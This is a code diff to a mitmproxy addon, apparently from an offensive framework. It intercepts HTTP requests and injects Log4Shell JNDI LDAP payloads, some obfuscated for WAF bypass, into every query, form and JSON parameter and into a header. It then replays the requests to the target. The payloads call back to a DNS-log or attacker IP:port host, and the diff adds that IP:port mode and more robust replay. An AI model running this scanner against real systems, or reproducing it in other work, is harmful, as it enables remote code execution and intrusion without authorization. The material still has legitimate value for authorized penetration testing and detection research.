@@ -3,12 +3,14 @@
 # @Date  : 2021/12/16
 # @Desc  :
 """Modify HTTP query parameters."""
+import ipaddress
 import json
 import random
 import string
 import uuid
 
 import redis
+import requests
 import yaml
 from mitmproxy import ctx
 from mitmproxy import http
@@ -52,21 +54,42 @@ class RedisClient(object):
             ctx.log.error(E)
 
     def publish_data(self, data):
-        result = self.rcon.publish(VIPER_RPC_UUID_JSON_DATA, data)
+        if self.rcon is None:
+            try:
+                self.rcon = redis.Redis.from_url(url=f"{get_redis_url()}5")
+            except Exception as E:
+                self.rcon = None
+                ctx.log.error(E)
+        try:
+            result = self.rcon.publish(VIPER_RPC_UUID_JSON_DATA, data)
+        except Exception as E:
+            self.rcon = None
 
     def rpc_call(self, method_name, timeout=100, **kwargs):
+        if self.rcon is None:
+            try:
+                self.rcon = redis.Redis.from_url(url=f"{get_redis_url()}5")
+            except Exception as E:
+                self.rcon = None
+                ctx.log.error(E)
+
         message_queue = "rpcviper"
         function_call = {'function': method_name, 'kwargs': kwargs}
         response_queue = f"{message_queue}:rpc:{random_str(32)}"
         rpc_request = {'function_call': function_call, 'response_queue': response_queue}
         rpc_raw_request = json.dumps(rpc_request)
-        self.rcon.rpush(message_queue, rpc_raw_request)
-        message_queue, rpc_raw_response = self.rcon.blpop(response_queue, timeout)
-        if rpc_raw_response is None:
-            self.rcon.lrem(message_queue, 0, rpc_raw_request)
-            return
-        rpc_response = json.loads(rpc_raw_response.decode())
-        return rpc_response
+
+        try:
+            self.rcon.rpush(message_queue, rpc_raw_request)
+            message_queue, rpc_raw_response = self.rcon.blpop(response_queue, timeout)
+            if rpc_raw_response is None:
+                self.rcon.lrem(message_queue, 0, rpc_raw_request)
+                return
+            rpc_response = json.loads(rpc_raw_response.decode())
+            return rpc_response
+        except Exception as E:
+            self.rcon = None
+            ctx.log.error(E)
 
 
 # common
@@ -134,6 +157,17 @@ class Payload(object):
     def __init__(self):
         pass
 
+    def is_ip_port(self, dnslog_base):
+        try:
+            ip_port = dnslog_base.split(":")
+            port = int(ip_port[1])
+            if port < 0 or port > 65535:
+                return False
+            ip = ipaddress.IPv4Address(ip_port[0])
+            return True
+        except Exception as E:
+            return False
+
     def bypass_waf_payload(self, raw_payload):
         new_payload = ""
         for one_raw in raw_payload:
@@ -145,8 +179,12 @@ class Payload(object):
         return new_payload
 
     def get_payload_list(self, req_uuid, dnslog_base):
-        raw_payload = f"jndi:ldap://{req_uuid}.{dnslog_base}/hi"
-        bypass_payload = self.bypass_waf_payload(raw_payload)
+        if self.is_ip_port(dnslog_base):
+            raw_payload = f"jndi:ldap://{dnslog_base}/{req_uuid}"
+            bypass_payload = self.bypass_waf_payload(raw_payload)
+        else:
+            raw_payload = f"jndi:ldap://{req_uuid}.{dnslog_base}/hi"
+            bypass_payload = self.bypass_waf_payload(raw_payload)
         return [f"${{{raw_payload}}}", f"${{{bypass_payload}}}"]
 
 
@@ -176,7 +214,10 @@ class Log4jAddon(object):
             "LEVEL": level,
             "DATA": data,
         })
-        result = self.rcon.publish_data(senddata)
+        try:
+            result = self.rcon.publish_data(senddata)
+        except Exception as E:
+            pass
 
     def payload_list(self, req_uuid):
         dnslog_base = self.rcon.rpc_call("Setting.dnslog_base")
@@ -198,40 +239,43 @@ class Log4jAddon(object):
         if flow.request.method == "GET":
             if flow.request.query:
 
-                flow = flow.copy()
                 req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
                 payloads = self.payload_list(req_uuid)
-
-                for payload in payloads:
-
-                    for key in flow.request.query:
-                        flow.request.query[key] = payload
-
-                    flow.request.headers[self.get_header()] = payload
-                    # 每个payload发送一次
-                    ctx.master.commands.call("replay.client", [flow])
 
                 data = {
                     "method": "GET",
                     "url": flow.request.pretty_url,
                 }
                 self.send_data(req_uuid, data)
+
+                flow = flow.copy()
+                for payload in payloads:
+
+                    for key in flow.request.query:
+                        flow.request.query[key] = payload
+
+                    flow.request.headers[self.get_header()] = payload
+
+                    # 每个payload发送一次
+                    try:
+                        result = requests.get(flow.request.pretty_url,
+                                              headers=dict(flow.request.headers),
+                                              params=dict(flow.request.query))
+                    except Exception as E:
+                        print(E)
+
+                    # 每个payload发送一次
+                    try:
+                        ctx.master.commands.call("replay.client", [flow])
+                    except Exception as E:
+                        print(E)
+
         elif flow.request.method == "POST":
             if flow.request.urlencoded_form:
 
                 flow = flow.copy()
                 req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
                 payloads = self.payload_list(req_uuid)
-
-                for payload in payloads:
-
-                    for key in flow.request.urlencoded_form:
-                        flow.request.urlencoded_form[key] = payload
-
-                    flow.request.headers[self.get_header()] = payload
-
-                    # 每个payload发送一次
-                    ctx.master.commands.call("replay.client", [flow])
 
                 data = {
                     "method": "POST",
@@ -240,28 +284,49 @@ class Log4jAddon(object):
                 }
                 self.send_data(req_uuid, data)
 
-            elif flow.request.multipart_form:
-
-                flow = flow.copy()
-                req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
-                payloads = self.payload_list(req_uuid)
-
                 for payload in payloads:
-
-                    for key in flow.request.multipart_form:
-                        flow.request.multipart_form[key] = payload
+                    print(flow.request.urlencoded_form)
+                    for key in flow.request.urlencoded_form:
+                        flow.request.urlencoded_form[key] = payload
 
                     flow.request.headers[self.get_header()] = payload
 
                     # 每个payload发送一次
-                    ctx.master.commands.call("replay.client", [flow])
+                    try:
+                        result = requests.post(flow.request.pretty_url,
+                                               headers=dict(flow.request.headers),
+                                               data=dict(flow.request.urlencoded_form))
+                    except Exception as E:
+                        print(E)
 
-                data = {
-                    "method": "POST",
-                    "url": flow.request.pretty_url,
-                    "multipart_form": dict(flow.request.multipart_form),
-                }
-                self.send_data(req_uuid, data)
+                    # 每个payload发送一次
+                    try:
+                        result = ctx.master.commands.call("replay.client", [flow])
+                    except Exception as E:
+                        print(E)
+
+            # elif flow.request.multipart_form:
+            #
+            #     flow = flow.copy()
+            #     req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
+            #     payloads = self.payload_list(req_uuid)
+            #
+            #     data = {
+            #         "method": "POST",
+            #         "url": flow.request.pretty_url,
+            #         "multipart_form": dict(flow.request.multipart_form),
+            #     }
+            #     self.send_data(req_uuid, data)
+            #
+            #     for payload in payloads:
+            #
+            #         for key in flow.request.multipart_form:
+            #             flow.request.multipart_form[key] = payload
+            #
+            #         flow.request.headers[self.get_header()] = payload
+            #
+            #         # 每个payload发送一次
+            #         ctx.master.commands.call("replay.client", [flow])
 
             else:
                 if is_json(flow.request.content):
@@ -269,6 +334,13 @@ class Log4jAddon(object):
                     flow = flow.copy()
                     req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
                     payloads = self.payload_list(req_uuid)
+
+                    data = {
+                        "method": "POST",
+                        "url": flow.request.pretty_url,
+                        "json": flow.request.text,
+                    }
+                    self.send_data(req_uuid, data)
 
                     for payload in payloads:
                         old_dict = json.loads(flow.request.text)
@@ -278,14 +350,18 @@ class Log4jAddon(object):
                         flow.request.headers[self.get_header()] = payload
 
                         # 每个payload发送一次
-                        ctx.master.commands.call("replay.client", [flow])
+                        try:
+                            result = requests.post(flow.request.pretty_url,
+                                                   headers=dict(flow.request.headers),
+                                                   json=new_dict)
+                        except Exception as E:
+                            print(E)
 
-                    data = {
-                        "method": "POST",
-                        "url": flow.request.pretty_url,
-                        "json": flow.request.text,
-                    }
-                    self.send_data(req_uuid, data)
+                        # 每个payload发送一次
+                        try:
+                            ctx.master.commands.call("replay.client", [flow])
+                        except Exception as E:
+                            print(E)
 
 
 ## main
